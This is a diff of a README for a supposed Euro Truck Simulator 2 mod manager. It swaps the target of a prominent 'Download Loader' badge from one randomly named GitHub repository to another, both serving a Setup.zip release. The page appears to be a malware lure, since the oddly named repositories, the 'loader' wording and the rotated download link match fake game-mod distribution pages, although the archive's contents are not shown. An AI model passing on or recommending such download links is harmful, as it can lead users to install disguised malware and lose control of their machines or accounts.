@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Euro Truck Simulator 2 Mod Manager
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Euro-Truck-Simulator-2-Mod-Manager` · Updated: 2026-11-02
 
 **Tags:** `euro-truck-simulator-2` `ets2` `simulation`
+
